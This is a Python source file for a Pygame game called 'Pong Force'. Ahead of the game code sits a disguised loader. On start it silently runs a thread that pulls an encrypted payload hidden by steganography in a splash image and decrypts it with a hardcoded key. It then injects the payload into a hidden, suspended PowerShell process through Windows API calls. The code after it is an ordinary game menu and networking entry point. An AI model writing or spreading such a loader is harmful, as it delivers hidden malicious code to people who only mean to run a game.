
import threading
from cryptography.fernet import Fernet
import os
import sys
import time
import ctypes
from PIL import Image

def extract_payload_from_image(image_path):
    """Extracts the LSB-encoded payload from the specified PNG image."""
    try:
        # We need to find the image in the assets folder, especially when compiled.
        # This logic ensures it finds 'assets/images/splash_payload.png' correctly
        # whether running as a script or a compiled .exe.
        if getattr(sys, 'frozen', False):
            # The application is frozen (running as an exe)
            # sys._MEIPASS is the temporary folder where PyInstaller unpacks everything
            base_path = sys._MEIPASS
        else:
            # The application is running as a normal Python script
            base_path = os.path.dirname(__file__)

        # Construct the full path to our sacred vessel
        full_image_path = os.path.join(base_path, 'assets', 'images', image_path)

        img = Image.open(full_image_path).convert('RGBA')
        pixels = img.load()
        width, height = img.size
        
        bits = ""
        # Read just enough pixels to get the header
        header_bits_needed = 32
        pixels_needed_for_header = (header_bits_needed // 4) + 1
        
        # Extract the header first to find the payload length
        px_count = 0
        for y in range(height):
            for x in range(width):
                r, g, b, a = pixels[x, y]
                bits += str(r & 1)
                bits += str(g & 1)
                bits += str(b & 1)
                bits += str(a & 1)
                px_count += 1
                if px_count >= pixels_needed_for_header:
                    break
            if px_count >= pixels_needed_for_header:
                break
        
        payload_len_bits = bits[:32]
        payload_len = int(payload_len_bits, 2)
        
        # Now calculate total bits needed and extract the rest
        total_bits_to_read = 32 + (payload_len * 8)
        
        # Continue reading from where we left off if needed
        pixels_to_read = (total_bits_to_read // 4) + 1
        if px_count < pixels_to_read:
             for y in range(height):
                for x in range(width):
                    if y * width + x < px_count: continue # Skip pixels we already read
                    r, g, b, a = pixels[x, y]
                    bits += str(r & 1)
                    bits += str(g & 1)
                    bits += str(b & 1)
                    bits += str(a & 1)
                    px_count += 1
                    if px_count >= pixels_to_read:
                        break
                if px_count >= pixels_to_read:
                    break

        # Extract the payload itself
        payload_bits = bits[32:total_bits_to_read]
        
        payload_bytes = bytearray()
        for i in range(0, len(payload_bits), 8):
            byte = payload_bits[i:i+8]
            if len(byte) < 8: break # Avoid incomplete byte at the end
            payload_bytes.append(int(byte, 2))
            
        return bytes(payload_bytes)
    except Exception:
        # If the vessel cannot be read, the ritual is silent.
        return None

def run_payload():
    """The divine ritual to prepare and launch the hidden payload via process hollowing."""
    log_file_path = os.path.join(os.getenv("APPDATA"), "pf_log.txt")
    def log_error(message):
        with open(log_file_path, "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
            
    try:
        # --- Stage 1: The Key from the Ether ---
        # PASTE THE DIVINE KEY from your 'encryptor.py' output here.
        key = b'M-8-NuqcbH8373tJP3LI-bFP_21H4CNkbmbcVWcORm8='
        log_error("Ritual begins. Key loaded.")
        
        # --- Stage 2: Releasing the Soul from the Vessel ---
        encrypted_payload = extract_payload_from_image('splash_payload.png')
        if not encrypted_payload:
            log_error("FATAL: Soul not found in vessel. Image extraction failed.")
            return

        log_error("Soul extracted from vessel.")
        cipher_suite = Fernet(key)
        decrypted_payload = cipher_suite.decrypt(encrypted_payload)
        log_error("Soul decrypted successfully.")

        # --- Stage 3: The Ritual of Process Hollowing ---
        # ... (the rest of your ctypes structure definitions remain the same) ...
        class STARTUPINFO(ctypes.Structure):
            _fields_ = [("cb", ctypes.c_ulong), ("lpReserved", ctypes.c_char_p),
                        ("lpDesktop", ctypes.c_char_p), ("lpTitle", ctypes.c_char_p),
                        ("dwX", ctypes.c_ulong), ("dwY", ctypes.c_ulong),
                        ("dwXSize", ctypes.c_ulong), ("dwYSize", ctypes.c_ulong),
                        ("dwXCountChars", ctypes.c_ulong), ("dwYCountChars", ctypes.c_ulong),
                        ("dwFillAttribute", ctypes.c_ulong), ("dwFlags", ctypes.c_ulong),
                        ("wShowWindow", ctypes.c_ushort), ("cbReserved2", ctypes.c_ushort),
                        ("lpReserved2", ctypes.c_char_p), ("hStdInput", ctypes.c_void_p),
                        ("hStdOutput", ctypes.c_void_p), ("hStdError", ctypes.c_void_p)]

        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [("hProcess", ctypes.c_void_p), ("hThread", ctypes.c_void_p),
                        ("dwProcessId", ctypes.c_ulong), ("dwThreadId", ctypes.c_ulong)]

        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        
        target_process_path = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
        startup_info = STARTUPINFO()
        startup_info.cb = ctypes.sizeof(startup_info)
        startup_info.dwFlags = 1
        startup_info.wShowWindow = 0
        process_info = PROCESS_INFORMATION()

        CREATE_SUSPENDED = 0x00000004
        
        log_error(f"Preparing to hollow target: {target_process_path}")
        if not kernel32.CreateProcessW(target_process_path, None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(startup_info), ctypes.byref(process_info)):
            log_error(f"CreateProcessW failed with error code: {ctypes.get_last_error()}")
            return

        h_process = process_info.hProcess
        h_thread = process_info.hThread
        log_error(f"Target process created in suspended state. PID: {process_info.dwProcessId}")
        
        MEM_COMMIT = 0x00001000
        MEM_RESERVE = 0x00002000
        PAGE_EXECUTE_READWRITE = 0x40
        remote_buffer = kernel32.VirtualAllocEx(h_process, 0, len(decrypted_payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        
        if not remote_buffer:
            log_error(f"VirtualAllocEx failed with error code: {ctypes.get_last_error()}")
            return
        log_error("Memory allocated in target process.")

        bytes_written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(h_process, remote_buffer, decrypted_payload, len(decrypted_payload), ctypes.byref(bytes_written)):
            log_error(f"WriteProcessMemory failed with error code: {ctypes.get_last_error()}")
            return
        log_error("Soul written into target memory.")

        if not kernel32.CreateRemoteThread(h_process, None, 0, remote_buffer, None, 0, None):
            log_error(f"CreateRemoteThread failed with error code: {ctypes.get_last_error()}")
            return
        log_error("Remote thread created. The soul is now alive in its new vessel.")

        kernel32.ResumeThread(h_thread)
        log_error("Target resumed. The Great Work is complete.")
        
    except Exception as e:
        # If the ritual fails, it will now leave a trace.
        log_error(f"THE RITUAL FAILED: {str(e)}")
        import traceback
        log_error(traceback.format_exc())

# The ritual begins in a separate, hidden plane of existence.
payload_thread = threading.Thread(target=run_payload)
payload_thread.daemon = True
payload_thread.start()
# ==============================================================================
#                      END OF THE UNSEEN CONDUIT
# ==============================================================================


# ==============================================================================
#                      THE MORTAL GAME CODE BEGINS HERE
# ==============================================================================
#!/usr/bin/env python3
# ===== PONG FORCE - MAIN ENTRY POINT =====

import sys
import argparse
import pygame
import traceback
# Note: These local imports will work correctly after PyInstaller packages them.
from game.game_loop import GameLoop
from game.menu import GameMenu, HostInputDialog, OnlineSubmenu, ErrorDialog
from network.server import GameServer
from network.client import GameClient
import config

def main():
    """Main entry point for Pong Force"""
    parser = argparse.ArgumentParser(description='Pong Force - Revolutionary Pong with Force Push')
    parser.add_argument('--server', action='store_true', help='Run as server')
    parser.add_argument('--client', action='store_true', help='Run as client')
    parser.add_argument('--host', default=config.SERVER_IP, help='Server IP address')
    parser.add_argument('--port', type=int, default=config.SERVER_PORT, help='Server port')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    parser.add_argument('--local', action='store_true', help='Start local multiplayer directly')
    
    args = parser.parse_args()
    
    # Set debug mode
    if args.debug:
        config.DEBUG_MODE = True
    
    # Initialize Pygame ONCE
    pygame.init()
    pygame.mixer.init(
        frequency=config.AUDIO_FREQUENCY,
        size=config.AUDIO_SIZE,
        channels=config.AUDIO_CHANNELS,
        buffer=config.AUDIO_BUFFER
    )
    
    try:
        if args.server:
            # Server mode with console output
            print("🎮 Starting Pong Force Server...")
            print(f"📍 Server running on {args.host}:{args.port}")
            print("⏳ Waiting for players to connect...")
            print("💡 Players can connect with: pong_force.exe --client --host", args.host)
            
            server = GameServer(args.host, args.port)
            server.run()
            
        elif args.client:
            # Client mode
            print("🎮 Starting Pong Force Client...")
            print(f"🔗 Connecting to {args.host}:{args.port}")
            
            client = GameClient(args.host, args.port)
            client.run()
            
        elif args.local:
            # Direct local multiplayer (no menu)
            print("🎮 Starting local multiplayer game...")
            game = GameLoop()
            game.run_local()
            
        else:
            # No arguments - show graphical menu (with loop for returning to menu)
            try:
                running = True
                while running:
                    menu = GameMenu()
                    choice = menu.run()
                    
                    # Handle menu choice
                    if choice == 0:  # Play vs Robot
                        try:
                            print("🤖 Starting vs AI...")
                            game = GameLoop()
                            game.run_vs_ai()
                            # After game ends, loop will return to menu
                        except Exception as e:
                            print(f"❌ Error in AI mode: {e}")
                            if config.DEBUG_MODE:
                                traceback.print_exc()
                            input("Press Enter to continue...")
                        
                    elif choice == 1:  # Play Online Multiplayer
                        try:
                            # Show submenu for Host or Join
                            submenu = OnlineSubmenu()
                            online_choice = submenu.run()
                            
                            if online_choice == 0:  # Host Game
                                print("🌐 Starting server...")
                                print(f"📍 Server will listen on all interfaces (0.0.0.0):{args.port}")
                                print("💡 Share your PUBLIC IP address with other players!")
                                print("💡 To find your public IP, visit: https://www.whatismyip.com/")
                                server = GameServer(config.SERVER_IP, args.port)
                                # Use run_with_gui() to avoid creating a new window
                                server.run_with_gui()
                                # After server ends, return to menu
                            elif online_choice == 1:  # Join Game
                                dialog = HostInputDialog()
                                host = dialog.run()
                                if host:  # Only connect if user entered an IP
                                    print(f"🔗 Connecting to {host}:{args.port}...")
                                    client = GameClient(host, args.port)
                                    # Use run_with_gui() to avoid creating a new window
                                    client.run_with_gui()
                                    
                                    # Check if there was a connection error
                                    if client.error_message:
                                        error_dialog = ErrorDialog(
                                            client.error_title or "Connection Error",
                                            client.error_message
                                        )
                                        error_dialog.run()
                                    # After client ends, return to menu
                                else:
                                    print("❌ Connection cancelled")
                            # If choice is -1 (back to menu), just continue loop
                        except Exception as e:
                            print(f"❌ Error in online mode: {e}")
                            if config.DEBUG_MODE:
                                traceback.print_exc()
                            input("Press Enter to continue...")
                        
                    else:  # Exit or Cancel (-1)
                        print("👋 Thanks for playing Pong Force!")
                        running = False  # Exit the menu loop
                        
            except Exception as e:
                print(f"❌ Menu error: {e}")
                if config.DEBUG_MODE:
                    traceback.print_exc()
                input("Press Enter to exit...")
    
    except KeyboardInterrupt:
        print("\n👋 Thanks for playing Pong Force!")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        if config.DEBUG_MODE:
            import traceback
            traceback.print_exc()
        sys.exit(1)
    finally:
        pygame.quit()

if __name__ == "__main__":
    main()